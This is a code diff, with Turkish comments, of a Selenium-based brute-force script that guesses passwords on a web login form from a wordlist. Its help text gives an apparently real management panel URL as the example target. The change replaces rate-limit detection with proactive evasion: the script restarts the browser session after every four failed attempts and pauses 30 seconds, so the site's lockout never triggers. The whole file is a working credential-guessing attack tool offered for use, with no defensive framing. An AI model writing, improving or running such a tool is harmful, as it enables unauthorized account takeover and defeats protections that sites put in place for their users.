@@ -12,7 +12,6 @@ from webdriver_manager.firefox import GeckoDriverManager
 def setup_browser_session(url):
     """
     Yeni bir tarayıcı oturumu başlatır, sayfayı açar ve giriş elementlerinin yüklenmesini bekler.
-    Bu versiyon, önce yükleme ekranının kaybolmasını bekler.
     """
     print("\n[*] Yeni bir tarayıcı oturumu başlatılıyor...")
     service = FirefoxService(GeckoDriverManager().install())
@@ -22,18 +21,13 @@ def setup_browser_session(url):
     
     print("[*] Sayfa yüklendi. Yükleme ekranının (splash screen) kaybolması bekleniyor...")
     try:
-        # 1. Yükleme ekranının kaybolmasını 30 saniyeye kadar bekle.
-        # Sitenin kaynak kodunda <div class="splash-screen">...</div> gördük.
         wait = WebDriverWait(driver, 30)
         splash_screen_selector = (By.CLASS_NAME, "splash-screen")
         wait.until(EC.invisibility_of_element_located(splash_screen_selector))
         print("[*] Yükleme ekranı kayboldu.")
-
     except TimeoutException:
-        # Eğer splash screen 30 saniyede kaybolmazsa, yine de devam etmeyi dene.
         print("[!] Yükleme ekranı 30 saniye içinde kaybolmadı, yine de devam ediliyor...")
 
-    # 2. Şimdi giriş formunun elementlerini ara.
     print("[*] Giriş formu elementleri aranıyor...")
     form_wait = WebDriverWait(driver, 15) 
 
@@ -51,7 +45,7 @@ def setup_browser_session(url):
 
 
 def main():
-    parser = argparse.ArgumentParser(description='Akıllı Rate Limit Tespiti Yapan Bruteforce Aracı.')
+    parser = argparse.ArgumentParser(description='Proaktif Rate Limit Önleyici Bruteforce Aracı.')
     parser.add_argument('url', help='Hedef web sitesinin URL\'si (örn: https://mgmt.yenihavale.net/login)')
     parser.add_argument('-u', '--username', required=True, help='Kullanılacak kullanıcı adı.')
     parser.add_argument('-w', '--wordlist', required=True, help='Denenecek şifrelerin bulunduğu dosya.')
@@ -83,15 +77,17 @@ def main():
     
     while current_password_index < len(passwords) and not found_password:
         driver = None
-        rate_limited = False
         try:
             driver, username_field, password_field, login_button = setup_browser_session(args.url)
             username_field.send_keys(args.username)
             print(f"[*] Denemelere {current_password_index + 1}. şifreden devam ediliyor...")
-
+            
+            # Bu oturumda en fazla 4 deneme hakkımız var.
+            attempts_in_this_session = 0
+            
+            # Kaldığımız yerden şifreleri denemeye başla
             for i in range(current_password_index, len(passwords)):
                 password = passwords[i]
-                current_password_index = i
                 
                 print(f"[*] Denenen: {password}", end='\r')
                 
@@ -99,7 +95,10 @@ def main():
                 password_field.send_keys(password)
                 login_button.click()
                 
+                attempts_in_this_session += 1
+                
                 try:
+                    # Başarı durumu: URL'nin 3 saniye içinde değişmesi
                     WebDriverWait(driver, 3).until(lambda d: args.url not in d.current_url)
                     
                     current_url = driver.current_url
@@ -110,18 +109,17 @@ def main():
                     time.sleep(30)
                     break 
                 except TimeoutException:
-                    try:
-                        rate_limit_xpath = "//*[contains(text(), 'Çok fazla istek gönderdiniz') or contains(text(), 'daha sonra tekrar deneyiniz')]"
-                        WebDriverWait(driver, 1).until(EC.visibility_of_element_located((By.XPATH, rate_limit_xpath)))
-                        
-                        print("\n[!] Rate limit mesajı tespit edildi! Oturum yeniden başlatılacak.")
-                        rate_limited = True
-                        break 
-                    except TimeoutException:
+                    # Giriş başarısız.
+                    current_password_index = i + 1 # Bir sonraki deneme için indeksi ayarla
+                    if attempts_in_this_session >= 4:
+                        print(f"\n[!] 4 deneme yapıldı. Rate limit'e takılmamak için oturum yeniden başlatılacak.")
+                        break # Bu oturumu sonlandır ve yeniden başlat.
+                    else:
                         continue
-        
+            
         except Exception as e:
             print(f"\n[!] Oturumda beklenmedik bir hata oluştu ({type(e).__name__}). Oturum yeniden başlatılacak.")
+            current_password_index += 1 # Hatalı şifreyi atla
             
         finally:
             if driver:
@@ -131,7 +129,7 @@ def main():
         if found_password:
             break
 
-        if rate_limited or (not found_password and current_password_index < len(passwords)):
+        if not found_password and current_password_index < len(passwords):
             print("[!] Yeni oturumdan önce 30 saniye bekleniyor...")
             time.sleep(30)
     
